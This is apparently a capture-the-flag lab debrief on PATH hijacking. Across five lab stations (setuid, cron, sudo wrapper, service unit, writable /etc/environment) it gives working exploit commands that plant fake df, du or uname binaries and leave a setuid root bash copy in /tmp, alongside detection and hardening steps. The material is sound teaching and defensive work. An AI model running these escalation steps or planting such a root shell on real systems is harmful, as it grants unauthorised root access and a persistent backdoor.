# Chapter 04 debrief — PATH Hijacking

Host `hollow-ops-01`. Flag: `R2R{p4th_is_searched_left_to_right}`.

One idea, five triggers. A and B are the labs you already ran. C, D, and E
are planted on this host. In every case root executes a short name, and the
directory searched first is one `labuser1` can write.

The shell you get from a timer dies when the job exits. Copy bash out first:

```bash
cp /bin/bash /tmp/rb && chmod 6777 /tmp/rb
/tmp/rb -p
```

`-p` keeps the root privileges on a shell that was started as root.

---

## Station A — setuid trigger

Already planted on `target-suid` as Chapter 01 Station C. `logstats` is
setuid root and calls `du` with no slash. A `du` you place in a directory
at the front of `PATH` runs as root.

```bash
echo '#!/bin/sh' > /tmp/du
echo 'exec /bin/sh -p' >> /tmp/du
chmod +x /tmp/du
PATH=/tmp:$PATH /usr/local/bin/logstats
```

---

## Station B — cron trigger

Already planted on `target-cron` as Chapter 02 Station D. The cron file
sets `PATH` so `/opt/maint/bin` is searched first, and the job calls `df`
with no slash. That directory is writable. Wait for the next minute, then
`/tmp/rb -p`.

---

## Station C — sudo wrapper · ★★☆☆

### 1. Recon

```bash
sudo -l
# (ALL) NOPASSWD: /opt/admin/disk-check.sh
ls -l /opt/admin/disk-check.sh
# -rwxr-xr-x root root     you cannot edit the script
cat /opt/admin/disk-check.sh
ls -ld /opt/admin/bin
# drwxrwxrwx             you can create files here
```

### 2. The flaw

Ubuntu sudo sets `secure_path`, so the `PATH` from your shell is not the
`PATH` the sudo command inherits. This script then exports its own `PATH`,
and the first directory is `/opt/admin/bin`, mode `0777`. The next line is
`df` with no slash. Bash searches `/opt/admin/bin` first.

### 3. Exploit

```bash
cat > /opt/admin/bin/df << 'EOF'
#!/bin/sh
cp /bin/bash /tmp/rb
chmod 6777 /tmp/rb
EOF
chmod +x /opt/admin/bin/df
sudo /opt/admin/disk-check.sh
/tmp/rb -p
cat /root/flag.txt
```

### 4. Why it works

`sudo` runs `/opt/admin/disk-check.sh` as root because the sudoers rule
names that exact file. The script is root-owned and mode `0755`, so you
never change the script. You change the command the script looks up.
`export PATH="/opt/admin/bin:/usr/bin:/bin"` makes `df` resolve to your
file. Your file runs as root because the script is already root.

### 5. Detect

```bash
grep -R PATH /opt/admin /etc/sudoers /etc/sudoers.d
find /opt/admin/bin -type f -ls
```

A sudo script that sets `PATH` to a directory mode `0777` is the finding.

### 6. Harden

Call `/usr/bin/df`. Remove the `export PATH` line. Make `/opt/admin/bin`
mode `0755` and root-owned. Keep sudo's `secure_path`.

### 7. Real world

Home-grown admin wrappers do this constantly: "put our helper dir first so
we pick up the site `df`." The helper dir is left group-writable after a
deploy. `secure_path` does not save a script that assigns `PATH` itself.

---

## Station D — service PATH · ★★☆☆

### 1. Recon

```bash
cat /etc/systemd/system/rtr-disk.service
cat /opt/svc/disk-status.sh
ls -ld /opt/svc/bin
ps -ef | grep rtr-unit-runner
```

Docker does not boot systemd. `/usr/local/sbin/rtr-unit-runner` is root's
clock. Every 20 seconds it reads `Environment=PATH` from the unit and runs
`/opt/svc/disk-status.sh` with that `PATH`. The script calls `df` by name.

### 2. The flaw

The unit says `PATH=/opt/svc/bin:/usr/bin:/bin`. `/opt/svc/bin` is mode
`0777`. The name `df` is found there before `/usr/bin/df`.

### 3. Exploit

```bash
cat > /opt/svc/bin/df << 'EOF'
#!/bin/sh
cp /bin/bash /tmp/rb
chmod 6777 /tmp/rb
EOF
chmod +x /opt/svc/bin/df
# wait about 20 seconds
/tmp/rb -p
cat /root/flag.txt
```

### 4. Why it works

systemd would set the unit `PATH` and then exec `ExecStart`. The runner
does those two steps and nothing else. `disk-status.sh` does not use a
full path for `df`, so the unit `PATH` decides which file runs. The file
runs as root because the runner is root.

### 5. Detect

```bash
grep -R Environment=PATH /etc/systemd/system
find /opt/svc/bin -type f -ls
```

A unit `PATH` that starts with a writable directory is the finding.

### 6. Harden

`ExecStart` and every command inside it should use absolute paths.
`Environment=PATH` should not list a directory a normal user can write.
The stand-in runner should be removed on a host that has a real systemd;
the unit file would still be the bug.

### 7. Real world

Vendor unit files ship `Environment=PATH=/opt/vendor/bin:/usr/bin` and
`ExecStart` calls `collect` or `df` by name. The package creates
`/opt/vendor/bin` mode `0777` so the app can drop plugins. Same bug.

---

## Station E — /etc/environment · ★★☆☆

### 1. Recon

```bash
ls -l /etc/environment
cat /etc/environment
cat /opt/maint/env-report.sh
```

`/etc/environment` is mode `0666`. `env-report.sh` sources it and then
runs `uname` with no slash. The same runner ticks this job every 20 seconds.

### 2. The flaw

`/etc/environment` is the file PAM loads for a login. This job sources it
on purpose, which is what a login does. Because you can write the file,
you choose the `PATH` a root process will search. `uname` is then your
file.

### 3. Exploit

Keep the system directories on the end of `PATH`. A `PATH` that contains
only your directory breaks later commands.

```bash
mkdir -p /home/labuser1/bin
cat > /home/labuser1/bin/uname << 'EOF'
#!/bin/sh
cp /bin/bash /tmp/rb
chmod 6777 /tmp/rb
EOF
chmod +x /home/labuser1/bin/uname
printf 'PATH="/home/labuser1/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"\n' \
  > /etc/environment
# wait about 20 seconds
/tmp/rb -p
cat /root/flag.txt
```

### 4. Why it works

`set -a; . /etc/environment` exports every assignment in that file,
including `PATH`. The next simple command, `uname`, is resolved with that
`PATH`. The script is root, so your `uname` is root.

Your own later SSH session also picks up `/etc/environment` through PAM.
Leave the real directories on `PATH` or your next login cannot find `ls`.

### 5. Detect

```bash
ls -l /etc/environment
grep -n PATH /etc/environment
```

Mode `0666` on `/etc/environment` is the finding. A `PATH` whose first
directory is under `/home` or `/tmp` is the exploit in progress.

### 6. Harden

`chmod 644 /etc/environment` and `chown root:root`. Do not source it from
a root script that then calls commands by short name. Call `/usr/bin/uname`.

### 7. Real world

PAM's `pam_env` reads `/etc/environment` at login. A world-writable copy
shows up on appliances and on images built with a sloppy `chmod`. Combined
with any root cron or service that does `. /etc/environment`, it is a PATH
hijack with a system-looking filename.

---

## Clean up

`make reset-path` rebuilds the container. That restores `/etc/environment`,
deletes planted `df` and `uname` files, and puts the flag back to mode `600`.
